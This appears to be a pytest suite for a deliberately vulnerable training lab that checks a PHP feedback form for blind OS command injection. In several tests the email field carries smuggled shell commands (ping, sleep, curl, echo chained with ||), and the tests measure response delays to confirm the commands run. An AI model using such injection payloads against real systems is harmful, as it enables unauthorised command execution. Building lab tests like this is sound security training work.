import pytest
import requests
import time
from urllib.parse import urljoin

class TestOSCommandInjection:
    """Test suite for OS Command Injection with Time Delays lab"""
    
    @pytest.fixture
    def base_url(self):
        """Base URL for the application"""
        return "http://localhost:3206"
    
    @pytest.fixture
    def session(self):
        """Create a requests session"""
        return requests.Session()
    
    def test_application_accessible(self, base_url, session):
        """Test that the application is accessible"""
        response = session.get(base_url)
        assert response.status_code == 200
        assert "TechCorp" in response.text
    
    def test_feedback_page_accessible(self, base_url, session):
        """Test that the feedback page is accessible"""
        response = session.get(urljoin(base_url, "feedback.php"))
        assert response.status_code == 200
        assert "Système de Feedback" in response.text
    
    def test_admin_page_accessible(self, base_url, session):
        """Test that the admin page is accessible"""
        response = session.get(urljoin(base_url, "admin.php"))
        assert response.status_code == 200
        assert "Panneau d'Administration" in response.text
    
    def test_normal_feedback_submission(self, base_url, session):
        """Test normal feedback submission"""
        data = {
            'name': 'Test User',
            'email': 'test@example.com',
            'message': 'This is a test feedback'
        }
        
        start_time = time.time()
        response = session.post(urljoin(base_url, "feedback.php"), data=data)
        end_time = time.time()
        
        assert response.status_code == 200
        assert "Feedback soumis avec succès" in response.text
        
        # Normal submission should be fast (less than 2 seconds)
        assert (end_time - start_time) < 2
    
    def test_command_injection_time_delay(self, base_url, session):
        """Test command injection with time delay"""
        data = {
            'name': 'Test User',
            'email': 'x||ping+-c+10+127.0.0.1||',
            'message': 'This is a test feedback'
        }
        
        start_time = time.time()
        response = session.post(urljoin(base_url, "feedback.php"), data=data)
        end_time = time.time()
        
        assert response.status_code == 200
        assert "Feedback soumis avec succès" in response.text
        
        # Command injection should cause a delay (at least 8 seconds)
        execution_time = end_time - start_time
        assert execution_time >= 8, f"Expected delay of at least 8 seconds, got {execution_time:.2f} seconds"
    
    def test_command_injection_sleep(self, base_url, session):
        """Test command injection with sleep command"""
        data = {
            'name': 'Test User',
            'email': 'x||sleep+5||',
            'message': 'This is a test feedback'
        }
        
        start_time = time.time()
        response = session.post(urljoin(base_url, "feedback.php"), data=data)
        end_time = time.time()
        
        assert response.status_code == 200
        assert "Feedback soumis avec succès" in response.text
        
        # Sleep command should cause a delay (at least 4 seconds)
        execution_time = end_time - start_time
        assert execution_time >= 4, f"Expected delay of at least 4 seconds, got {execution_time:.2f} seconds"
    
    def test_command_injection_curl(self, base_url, session):
        """Test command injection with curl command"""
        data = {
            'name': 'Test User',
            'email': 'x||curl+-m+3+http://127.0.0.1:9999||',
            'message': 'This is a test feedback'
        }
        
        start_time = time.time()
        response = session.post(urljoin(base_url, "feedback.php"), data=data)
        end_time = time.time()
        
        assert response.status_code == 200
        assert "Feedback soumis avec succès" in response.text
        
        # Curl command should cause a delay (at least 2 seconds)
        execution_time = end_time - start_time
        assert execution_time >= 2, f"Expected delay of at least 2 seconds, got {execution_time:.2f} seconds"
    
    def test_vulnerability_presence(self, base_url, session):
        """Test that the vulnerability is present and exploitable"""
        # Test with a simple command that should execute
        data = {
            'name': 'Test User',
            'email': 'x||echo+test||',
            'message': 'This is a test feedback'
        }
        
        response = session.post(urljoin(base_url, "feedback.php"), data=data)
        assert response.status_code == 200
        assert "Feedback soumis avec succès" in response.text

if __name__ == "__main__":
    pytest.main([__file__, "-v"]) 